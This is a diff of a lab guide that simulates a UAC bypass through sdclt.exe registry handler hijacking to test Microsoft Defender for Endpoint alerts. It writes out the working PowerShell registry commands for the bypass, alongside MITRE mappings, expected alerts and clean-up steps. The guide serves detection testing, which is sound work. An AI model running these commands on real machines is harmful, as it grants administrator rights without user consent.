@@ -1,5 +1,10 @@
 # UAC Bypass
 
+> **Lab context:** On standalone MDE, start on `WinClient11` (`10.0.2.53`)
+> using deployment `username` (`.\cmadmin` by default) and the supplied
+> `password`. See [scenario setup and domain accounts](README.md#before-running-a-scenario)
+> before domain-dependent steps; domain joining and MDE onboarding are manual.
+
 ## Overview
 
 UAC Bypass is a technique where attackers elevate their privileges to gain administrator-level permissions without triggering a User Account Control (UAC) prompt. This allows them to perform restricted tasks without user confirmation, bypassing security checks that would typically prevent unauthorized actions. This simulation uses the sdclt.exe method (Backup and Restore utility) which exploits registry handler hijacking.
@@ -10,12 +15,6 @@ UAC Bypass is a technique where attackers elevate their privileges to gain admin
 | --- | --- | --- |
 | Privilege Escalation | T1548.002 | Abuse Elevation Control Mechanism: Bypass User Account Control |
 | Defense Evasion | T1112 | Modify Registry |
-
-## Expected Alerts
-
-| Alert Title | Alert Description | Alert Details |
-| --- | --- | --- |
-| UAC bypass was detected | A process has performed actions on a child process or another subsequent process that would normally require a User Account Control (UAC) prompt. This could be an attempt to elevate privileges without requesting user permission. | **Category:** Privilege escalation<br/>**MITRE ATT&CK Techniques:** T1112: Modify Registry, T1548.002: Bypass User Account Control<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior, Network<br/>**Detection status:** Detected |
 
 ## Attack Simulation
 
@@ -31,8 +30,8 @@ UAC Bypass is a technique where attackers elevate their privileges to gain admin
 
 | Parameter | Type | Required | Default | Description |
 | --- | --- | --- | --- | --- |
-| `CleanUp` | Switch | No | — | Remove the registry key created by the simulation |
-| `Force` | Switch | No | — | Skip the confirmation prompt before execution |
+| `-CleanUp` | Switch | No | Not set | Remove the registry key created by the simulation |
+| `-Force` | Switch | No | Not set | Skip the confirmation prompt before execution |
 
 #### What the Script Does
 
@@ -89,6 +88,12 @@ After successful execution, notepad.exe will launch with elevated privileges (wi
 6. Monitor the Microsoft Defender for Endpoint portal for UAC bypass alerts.
 7. After testing, run `.\Invoke-UACBypassSimulation.ps1 -CleanUp` to remove the registry modifications.
 
+## Expected Alerts
+
+| Alert Title | Alert Description | Alert Details |
+| --- | --- | --- |
+| UAC bypass was detected | A process has performed actions on a child process or another subsequent process that would normally require a User Account Control (UAC) prompt. This could be an attempt to elevate privileges without requesting user permission. | **Category:** Privilege escalation<br/>**MITRE ATT&CK Techniques:** T1112: Modify Registry, T1548.002: Bypass User Account Control<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior, Network<br/>**Detection status:** Detected |
+
 ## Why Does This Matter
 
 UAC bypass techniques are dangerous because:
@@ -111,14 +116,6 @@ Detecting UAC bypass attempts helps identify attackers attempting privilege esca
 
 ## Clean-Up
 
-```powershell
-New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
-New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
-Start-Process -FilePath "$env:windir\system32\sdclt.exe"
-```
-
-## Clean-Up
-
 Run the script with the `-CleanUp` parameter or manually remove the registry key:
 
 ```powershell
@@ -129,19 +126,19 @@ Run the script with the `-CleanUp` parameter or manually remove the registry key
 Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
 ```
 
-## References
+## Manual Commands
 
-- [MITRE ATT&CK T1548.002 - Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
-- [MITRE ATT&CK T1112 - Modify Registry](https://attack.mitre.org/techniques/T1112/)
-- [Microsoft Docs - User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview)
-- [UACME - UAC Bypass Methods](https://github.com/hfiref0x/UACME)
-
-## Additional Manual Commands
-
-### UAC Bypass (Manual Commands)
+### UAC Bypass
 
 ```powershell
 New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
 New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
 Start-Process -FilePath "$env:windir\system32\sdclt.exe"
 ```
+
+## References
+
+- [MITRE ATT&CK T1548.002 - Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
+- [MITRE ATT&CK T1112 - Modify Registry](https://attack.mitre.org/techniques/T1112/)
+- [Microsoft Docs - User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview)
+- [UACME - UAC Bypass Methods](https://github.com/hfiref0x/UACME)
